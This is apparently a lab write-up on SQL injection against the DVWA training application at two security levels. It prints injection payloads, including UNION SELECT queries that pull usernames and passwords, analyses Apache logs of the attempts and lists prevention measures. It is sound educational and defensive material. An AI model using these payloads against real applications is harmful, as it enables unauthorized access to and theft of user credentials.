# ðŸ’‰ SQL Injection

SQL Injection allows attackers to input values that are always evaluated as true, bypassing other conditions in the SQL query. For example, an input like `' OR 1=1;` modifies the SQL query behavior, enabling unauthorized access to sensitive data or functionalities. When the web server receives these malicious inputs, the SQL query is constructed, executed, and the results are returned in the web application response.

## Security Settings:

1. **LOW:** 
   - At this level, user input is directly embedded in the SQL query, making it highly vulnerable to SQL injection attacks. For instance, if the query contains `$id` directly:
      ```bash
      $id
      ```
     ![PrintScreen1](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/sqlinj1.png)
     ![PrintScreen2](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/sqlinj2.png)
     
   - By injecting a condition that always evaluates as true (e.g., `' OR 1=1;`)
   ```sql
      1' or '1'='1;
      ```
    ![PrintScreen3](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/sqlinj3.png)
   
   ```sql
   ' UNION SELECT user , password FROM users#
   ```
   ![PrintScreen4](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/sqlinj4.png)
   

2. **MEDIUM:**
    - What we tried before does not work now:
   ![PrintScreen5](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/sqlinj5.png)
   - At this level, the attacker can use `UNION SELECT` to combine results from different tables within the same query, such as extracting user passwords from the `users` table.
      ```sql
      1 or 1=1 UNION SELECT user, password FROM users#
      ```
   
   ![PrintScreen6](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/sqlinj6.png)

## Log Analysis:

> **Note:** `[IP_ADDR]` is used to anonymize the IP address for privacy. It represents the IP address from which the request originated.

1. **Analyzing Logs from /var/log/apache2**
   ![PrintScreen7](https://github.com/cataaptr/Cybersecurity-Practice-Labs/blob/main/img/log1.png)
   - `[IP_ADDR] - - [19/May/2024:12:55:11 -0400] "POST /dvwa/security.php HTTP/1.1" 302 - "http://[IP_ADDR]/dvwa/security.php" "Mozilla/5.0 ..."`
     - This line shows a POST request to `security.php`, resulting in a temporary redirect (HTTP response code 302). This redirection might be part of an authentication process where the user is directed to another page after submitting credentials.
   
   - `[IP_ADDR] - - [19/May/2024:12:55:14 -0400] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 4333 "http://[IP_ADDR]/dvwa/security.php" "Mozilla/5.0 ..."`
     - This successful GET request accesses the `sqli/` page, indicating a possible attempt to test for SQL injection.
   
   - `[IP_ADDR] - - [19/May/2024:13:01:41 -0400] "GET /dvwa/vulnerabilities/sqli/?id='%20UNION%20SELECT%20user,%20password%20FROM%20users%23&Submit=Submit HTTP/1.1" 200`
     - An attempt to retrieve usernames and passwords using `UNION SELECT`, with a successful response (HTTP 200), confirming the application is vulnerable.

## Effects of SQL Injection:

- Compromises web application integrity
- Allows unauthorized access to sensitive data, such as usernames, passwords, personal information, and financial details
- Data modification or deletion
- Unauthorized actions may be performed by the attacker within the application

## Prevention Measures:

- **Use Parameterized Queries and Prepared Statements:** Construct and execute SQL queries in a way that avoids SQL injection vulnerabilities.
- **User Input Validation and Filtering:** Sanitize and validate all user inputs.
- **Principle of Least Privilege:** Limit database access permissions for accounts used by the application.
- **Regular Auditing and Monitoring:** Routinely audit SQL queries, database activity, and monitor web traffic for signs of SQL injection attacks.
